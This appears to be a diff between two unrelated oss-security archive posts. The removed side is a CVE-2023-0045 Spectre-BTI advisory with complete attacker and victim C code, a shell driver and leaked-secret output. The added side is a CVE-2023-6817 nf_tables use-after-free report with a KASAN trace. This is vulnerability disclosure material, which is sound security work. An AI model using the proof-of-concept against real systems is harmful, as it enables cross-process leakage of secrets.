@@ -1,355 +1,154 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/04/5
-Message-ID: <CAL6-1qWtLqDf8+Gcf7+97yTAAc2UM8W7jvd__JytHSBKBs99Cg@mail.gmail.com>
-Date: Sat, 4 Feb 2023 14:51:30 -0600
-From: Rodrigo Branco <rodrigo@...nelhacking.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/22/6
+Message-ID: <ZYTxUd61RYu91Sf2@hhost>
+Date: Fri, 22 Dec 2023 10:16:24 +0800
+From: Xingyuan Mo <hdthky0@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2023-0045: Linux Kernel: Bypassing Spectre-BTI User Space Mitigations
+Subject: CVE-2023-6817: Linux kernel: use-after-free in nf_tables
 Content-Type: text/plain; charset=utf-8
 
-Here is the original write-up:
-https://github.com/es0j/CVE-2023-0045
+Hello,
 
-I am already talking to Rafael from Google to get their version updated.
+I found a use-after-free vulnerability in the implementation of pipapo set
+in Linux kernel nf_tables, which can lead to DoS or local privilege
+escalation, with CAP_NET_ADMIN capability required. The bug is fixed in
+v6.7-rc5 kernel and the patch is:
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=317eb9685095678f2c9f5a8189de698c5354316a
 
-The impact is low and would only affect applications that immediately load
-secrets after the prctl() call.
+=*=*=*=*=*=*=*=*=  Bug Details  =*=*=*=*=*=*=*=*=
+According to the design of nf_tables, when calling NFT_MSG_DELSETELEM
+command without a set element specified, all elements in the target set
+will be deleted. During this process, nft_set_flush() is called, which
+calls set->ops->walk() at (0).
 
+static int nft_set_flush(struct nft_ctx *ctx, struct nft_set *set, u8 genmask)
+{
+	struct nft_set_iter iter = {
+		.genmask	= genmask,
+		.fn		= nft_setelem_flush,
+	};
 
-Best regards,
+	set->ops->walk(ctx, set, &iter);   <==== (0)
+	if (!iter.err)
+		iter.err = nft_set_catchall_flush(ctx, set);
 
+	return iter.err;
+}
 
-On Fri, Feb 3, 2023, 12:59 PM Rodrigo Branco <rodrigo@...nelhacking.com>
-wrote:
+If the backend is a pipapo set, nft_pipapo_walk() will be called. This
+function does not check the activeness of an element before operating on
+it, just like similar functions in other set backend such as
+nft_rhash_walk(). Thus NFT_MSG_DELSETELEM command can be called
+twice in one transaction to deleted every element in that set twice,
+resulting in double free.
 
-> I am sorry but that is not Jose's and mine write-up.  We disagree
-> vehemently with the severity of the issue marked as high. Also, the
-> description, implications and target are all wrong.
->
-> I will work with Google folks to send an updated version but recommend
-> that others ignore the conclusions and implications for now.  I am
-> available if anyone needs to discuss further.
->
->
-> Best regards,
->
-> On Fri, Feb 3, 2023, 10:20 AM Rafael Correa De Ysasi <
-> rcorreadeysasi@...omium.org> wrote:
->
->> Summary
->>
->> The Linux kernel does not correctly mitigate SMT attacks, as discovered
->> through a strange pattern in the kernel API using STIBP as a mitigation[1
->> <https://docs.kernel.org/userspace-api/spec_ctrl.html>], leaving the
->> process exposed for a short period of time after a syscall. The kernel
->> also
->> does not issue an IBPB immediately during the syscall.
->> The ib_prctl_set [2
->> <
->> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467
->> >]function
->> updates the Thread Information Flags (TIFs) for the task and updates the
->> SPEC_CTRL MSR on the function __speculation_ctrl_update [3
->> <
->> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557
->> >],
->> but the IBPB is only issued on the next schedule, when the TIF bits are
->> checked. This leaves the victim vulnerable to values already injected on
->> the BTB, prior to the prctl syscall.
->> The behavior is only corrected after a reschedule of the task happens.
->> Furthermore, the kernel entrance (due to the syscall itself), does not
->> issue an IBPB in the default scenarios (i.e., when the kernel protects
->> itself via retpoline or eIBRS).
->> Severity
->>
->> High - The inability to correctly mitigate SMT attacks, leaves the kernel
->> exposed for an attacker to inject malicious code into the running kernel,
->> which could lead to a complete compromise of the system.
->> Proof of Concept
->>
->> To ensure this wasn't a measurement error, we created a simple POC. The
->> victim code always executes asafe_function through a function pointer that
->> is vulnerable to a spectre-BTI attack. The victim requests the kernel for
->> protection using the prctl syscall (inside protect_me). The victim also
->> loads a secret from a text file, showing that other syscalls don’t check
->> the TIF bit or provoke a reschedule that would force an IBPB.
->>
->> //gcc -o victim victim.c -O0 -masm=intel -no-pie -fno-stack-protector
->> #include "common.h"
->>
->> int main(int argc, char *argv[])
->> {
->>
->>     setvbuf(stdout, NULL, _IONBF, 0);
->>     printf("running victim %s\n", argv[1]);
->>
->>     //only call safe_function
->>     codePtr = safe_function;
->>     char secret[20];
->>     char *sharedmem = open_shared_mem();
->>     unsigned idx = string_to_unsigned(argv[1]);
->>
->>     //call for prctl to protect this process
->>     protect_me();
->>
->>     //only then load the secret into memory
->>     load_secret(secret);
->>
->>     for (int i = 0; i < 100; i++)
->>     {
->>         flush((char *)&codePtr);
->>         //this arguments are never used on safe_function, but they
->> match the signature of spectre_gadget, that should never be called
->>         //Since prctl is called, it shouldn't be possible for an
->> attacker to poison the BTB and leak the secret
->>         spec(&sharedmem[2000], secret, idx);
->>     }
->> }
->>
->> Most of the libc functions were placed inside a common header between the
->> attacker and the victim, so the spectre_gadget and spec functions share
->> the
->> same memory addresses on both victim and attacker (otherwise a .GOT entry
->> is created and the addresses are changed). This is not a requirement and
->> there are other ways to place the branches on the same addresses and mimic
->> the victim context, but this method is the simplest.
->>
->> #include <stdlib.h>
->> #include <sys/mman.h>
->> #include <fcntl.h>
->> #include <unistd.h>
->> #include <stdio.h>
->> #include <sys/prctl.h>
->>
->> char unused[0x1000];
->> void (*codePtr)(char *, char *, unsigned idx);
->> char unused2[0x1000];
->>
->> // this function does nothing. Always called by the victim
->> void safe_function(char *a, char *b, unsigned idx)
->> {
->> }
->>
->> // this function is never called by the victim
->> void spectre_gadget(char *addr, char *secret, unsigned idx)
->> {
->>     volatile char d;
->>     if ((secret[idx / 8] >> (idx % 8)) & 1)
->>         d = *addr;
->> }
->>
->> // helper for better results probably not necessary but makes the tests
->> easier
->> void flush(char *adrs)
->> {
->>     asm volatile(
->>         "clflush [%0]                   \n"
->>         :
->>         : "c"(adrs)
->>         :);
->> }
->>
->> // This function is vulnerable to a spectre-BTI attack.
->> void spec(char *addr, char *secret, unsigned idx)
->> {
->>
->>     for (register int i = 0; i < 30; i++)
->>         ;
->>     codePtr(addr, secret, idx);
->> }
->>
->> // opens file as read only in memory to be used as side channel, but
->> could be any other COW file like libc for example
->> char *open_shared_mem()
->> {
->>     int fd = open("sharedmem", O_RDONLY);
->>     char *res = (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
->>     // ensure page is on memory
->>     volatile char d = res[2100];
->>     return res;
->> }
->>
->> // load secret from file
->> void load_secret(char *secret)
->> {
->>     FILE *fp = fopen("secret.txt", "r");
->>     fgets(secret, 20, (FILE *)fp);
->> }
->>
->> // Calls prctl to protect the user against spectre-BTI attacks -
->> https://docs.kernel.org/userspace-api/spec_ctrl.html
->> void protect_me()
->> {
->>     usleep(1000); //not needed but resets the available time on scheduler
->>     prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
->> PR_SPEC_FORCE_DISABLE, 0, 0);
->> }
->>
->> // Utility. All utility functions are placed on common so the spec
->> function matches the same address on both victim and attacker. This is
->> not necessary but makes the tests easier
->> unsigned string_to_unsigned(char *s)
->> {
->>     return atoi(s);
->> }
->>
->>
->> The attack consists in poisoning the BTB by calling the spec function and
->> making it branch to spectre_gadget instead of safe_function. After the
->> training the victim process is created and it executes spec that
->> mispredicts to spectre_gadget which should never be executed. The secret
->> is
->> leaked through a classic flush+reload side channel.
->>
->> //gcc -o attacker attacker.c -O0 -masm=intel -no-pie -fno-stack-protector
->> #include "common.h"
->>
->> #define PRINTNUM 1000
->>
->> unsigned probe(char *adrs)
->> {
->>     volatile unsigned long time;
->>     asm __volatile__(
->>         "    mfence             \n"
->>         "    lfence             \n"
->>         "    rdtsc              \n"
->>         "    lfence             \n"
->>         "    mov esi, eax       \n"
->>         "    mov eax,[%1]       \n"
->>         "    lfence             \n"
->>         "    rdtsc              \n"
->>         "    sub eax, esi       \n"
->>         "    clflush [%1]       \n"
->>         "    mfence             \n"
->>         "    lfence             \n"
->>         : "=a"(time)
->>         : "c"(adrs)
->>         : "%esi", "%edx");
->>     return time;
->> }
->>
->> int main(int argc, char *argv[])
->> {
->>
->>     //Make spec function confuse safe_function with spectre_gadget
->>     codePtr = spectre_gadget;
->>
->>     char dummy;
->>     int hits = 0;
->>     int tries = 0;
->>     char *sharedmem = open_shared_mem();
->>     setvbuf(stdout, NULL, _IONBF, 0);
->>
->>     while (1)
->>     {
->>         //Inject the target in the BTB
->>         spec(&dummy, &dummy, 0);
->>
->>         //Allow for victim to execute and misspredict to spectre_gadget
->>         usleep(1);
->>
->>         //probe the 1-bit flush+reload side channel
->>         if (probe((char *)&sharedmem[2000]) < 0x90)
->>         {
->>             printf("+");
->>         }
->>     }
->> }
->>
->> Since the victim receives an argument that can be used to choose the bit
->> to
->> be leaked through the side channel, we can execute the victim process
->> multiple times while the attacker is executing:
->>
->> taskset -c 0 ./attacker >> result.txt &
->>
->> for i in {0..144}
->> do
->>     echo "Leaking bit $i... "
->>     echo -e -n "Leaking bit $i: " >> result.txt
->>     sleep .01
->>     for j in {0..10}
->>     do
->>         taskset -c 0 ./victim $i >/dev/null
->>     done
->>
->>     echo "" >> result.txt
->> done
->>
->> python3 parseResult.py
->>
->> make clean
->> echo -e "killing attacker"
->> kill -9 $(pidof attacker)
->>
->> This leaves the following text file:
->>
->> Leaking bit 0: +++++++++++
->> Leaking bit 1:
->> Leaking bit 2:
->> Leaking bit 3:
->> Leaking bit 4:
->> Leaking bit 5:
->> Leaking bit 6: ++++++++++
->> Leaking bit 7:
->> Leaking bit 8: ++++++++
->> [...]
->>
->> Note that bit 0 and 6 are 1, therefore the first character must be
->> 0x41(A).
->> Parsing the file with a simple Python script shows:The secret leaked is:
->> b'Asuper_secret_flag' which is the exact content present in secret.txt
->> used
->> by the victim.
->> Changing the prctl call for seccomp to
->> syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0); after loading the secret
->> doesn't prevent the attack. This is expected since internally both use the
->> same ib_prctl_set function to implement the mitigation.
->> Further Analysis
->>
->> The current implementation of the prctl syscall for speculative control
->> fails to protect the user against attackers executing before the
->> mitigation. The seccomp mitigation also fails in this scenario.
->> The patch that added support for the conditional mitigation via prctl
->> (ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been
->> introduced on Nov 28, 2018 in the following commit: torvalds/linux@...7bb2
->> <
->> https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241fa3a694f
->> >
->> and
->> the current __speculation_ctrl_update code that sets the MSRs, but without
->> the immediate IBPB, was added on the same day in the following commit:
->> torvalds/linux@...af56
->> <
->> https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb369b45dfa5
->> >.
->> This indicates that the issue has been present in the kernel for about 4
->> years.
->> Mitigations
->>
->> For user-mode applications, a usleep after the prctl call is enough to
->> force a reschedule and ensure the correct mitigation. One possible kernel
->> patch for this attack is to issue the IBPB just after the STIBP is set, on
->> __speculation_ctrl_update [3
->> <
->> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557
->> >]
->> or to call schedule(). After discussing with the Linux Kernel Security
->> Team, that is what was decided, and the following commit has the fix:
->>
->> https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=a664ec9158eeddd75121d39c9a0758016097fa96
->> .
->> Patch
->>
->> This was addressed in the following [commit].(
->>
->> https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/x86/kernel/cpu/bugs.c?h=v6.1.9&id=e8377f0456fb6738a4668d4df16c13d7599925fd
->> )
->> Timeline
->>
->> *Date reported*: 12/30/2022
->> *Date fixed*: 01/04/2023
->> *Date disclosed*: 02/03/2023
->>
->
+A POC is attached, which can be compiled with:
+gcc -o poc poc.c -lnftnl -lmnl
 
+I tested against v6.7-rc4 kernel and got a KASAN report as follows:
+[  286.833955] ==================================================================
+[  286.834580] BUG: KASAN: slab-use-after-free in nf_tables_trans_destroy_work+0x43c/0x630
+[  286.835253] Read of size 1 at addr ffff88800754ba88 by task kworker/0:0/8
+
+[  286.835931] CPU: 0 PID: 8 Comm: kworker/0:0 Not tainted 6.7.0-rc4 #1
+[  286.836440] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[  286.837167] Workqueue: events nf_tables_trans_destroy_work
+[  286.837619] Call Trace:
+[  286.837825]  <TASK>
+[  286.838005]  dump_stack_lvl+0x3b/0x50
+[  286.838316]  print_report+0xcf/0x620
+[  286.838621]  ? __virt_addr_valid+0xf7/0x180
+[  286.838974]  ? nf_tables_trans_destroy_work+0x43c/0x630
+[  286.839397]  ? kasan_complete_mode_report_info+0x80/0x210
+[  286.839839]  ? nf_tables_trans_destroy_work+0x43c/0x630
+[  286.840269]  kasan_report+0xbd/0x100
+[  286.840573]  ? nf_tables_trans_destroy_work+0x43c/0x630
+[  286.841001]  __asan_load1+0x66/0x70
+[  286.841297]  nf_tables_trans_destroy_work+0x43c/0x630
+[  286.841719]  ? __pfx_nf_tables_trans_destroy_work+0x10/0x10
+[  286.842175]  ? read_word_at_a_time+0x12/0x20
+[  286.842528]  ? kick_pool+0x39/0x1a0
+[  286.842829]  process_one_work+0x2e4/0x5c0
+[  286.843167]  worker_thread+0x520/0x790
+[  286.843491]  ? __pfx_worker_thread+0x10/0x10
+[  286.843849]  kthread+0x16e/0x1b0
+[  286.844119]  ? __pfx_kthread+0x10/0x10
+[  286.844433]  ret_from_fork+0x3b/0x70
+[  286.844750]  ? __pfx_kthread+0x10/0x10
+[  286.845069]  ret_from_fork_asm+0x1b/0x30
+[  286.845400]  </TASK>
+
+[  286.845735] Allocated by task 279:
+[  286.846028]  kasan_save_stack+0x2a/0x50
+[  286.846352]  kasan_set_track+0x29/0x40
+[  286.846669]  kasan_save_alloc_info+0x1f/0x30
+[  286.847030]  __kasan_kmalloc+0x88/0xa0
+[  286.847344]  __kmalloc+0x61/0x140
+[  286.847630]  nft_set_elem_init+0x72/0x270
+[  286.847971]  nft_add_set_elem+0xf7b/0x1bb0
+[  286.848315]  nf_tables_newsetelem+0x3fb/0x4d0
+[  286.848699]  nfnetlink_rcv_batch+0xcba/0xe90
+[  286.849055]  nfnetlink_rcv+0x1df/0x220
+[  286.849375]  netlink_unicast+0x3eb/0x540
+[  286.849703]  netlink_sendmsg+0x44d/0x7d0
+[  286.850039]  __sys_sendto+0x347/0x360
+[  286.850353]  __x64_sys_sendto+0x7f/0xa0
+[  286.850681]  do_syscall_64+0x46/0xf0
+[  286.850980]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+[  286.851546] Freed by task 8:
+[  286.851795]  kasan_save_stack+0x2a/0x50
+[  286.852121]  kasan_set_track+0x29/0x40
+[  286.852447]  kasan_save_free_info+0x2f/0x50
+[  286.852804]  __kasan_slab_free+0x113/0x1a0
+[  286.853155]  __kmem_cache_free+0x82/0x1b0
+[  286.853496]  kfree+0x78/0x120
+[  286.853752]  nf_tables_trans_destroy_work+0x460/0x630
+[  286.854177]  process_one_work+0x2e4/0x5c0
+[  286.854513]  worker_thread+0x520/0x790
+[  286.854840]  kthread+0x16e/0x1b0
+[  286.855113]  ret_from_fork+0x3b/0x70
+[  286.855424]  ret_from_fork_asm+0x1b/0x30
+
+[  286.855890] Last potentially related work creation:
+[  286.856296]  kasan_save_stack+0x2a/0x50
+[  286.856630]  __kasan_record_aux_stack+0x92/0xa0
+[  286.857028]  kasan_record_aux_stack_noalloc+0xf/0x20
+[  286.857449]  kvfree_call_rcu+0x2c/0x470
+[  286.857769]  kernfs_unlink_open_file+0x19c/0x1b0
+[  286.858155]  kernfs_fop_release+0x6b/0x180
+[  286.858500]  __fput+0x132/0x4e0
+[  286.858765]  __fput_sync+0x35/0x40
+[  286.859065]  __x64_sys_close+0x56/0xa0
+[  286.859390]  do_syscall_64+0x46/0xf0
+[  286.859695]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+[  286.860259] The buggy address belongs to the object at ffff88800754ba80
+                which belongs to the cache kmalloc-96 of size 96
+[  286.861228] The buggy address is located 8 bytes inside of
+                freed 96-byte region [ffff88800754ba80, ffff88800754bae0)
+
+[  286.862296] The buggy address belongs to the physical page:
+[  286.862745] page:00000000f0d84d4e refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x754b
+[  286.863468] anon flags: 0x100000000000800(slab|node=0|zone=1)
+[  286.863929] page_type: 0xffffffff()
+[  286.864219] raw: 0100000000000800 ffff888004c41780 ffffea00001bcb40 dead000000000005
+[  286.864849] raw: 0000000000000000 0000000000200020 00000001ffffffff 0000000000000000
+[  286.865451] page dumped because: kasan: bad access detected
+
+[  286.866030] Memory state around the buggy address:
+[  286.866412]  ffff88800754b980: 00 00 00 00 00 00 00 00 00 00 04 fc fc fc fc fc
+[  286.866977]  ffff88800754ba00: 00 00 00 00 00 00 00 00 00 04 fc fc fc fc fc fc
+[  286.867577] >ffff88800754ba80: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[  286.868185]                       ^
+[  286.868489]  ffff88800754bb00: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[  286.869089]  ffff88800754bb80: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[  286.869690] ==================================================================
+
+=*=*=*=*=*=*=*=*=  Discoverer  =*=*=*=*=*=*=*=*=
+Xingyuan Mo of IceSword Lab
+
+Best,
+Xingyuan Mo
+
+View attachment "poc.c" of type "text/x-csrc" (7988 bytes)
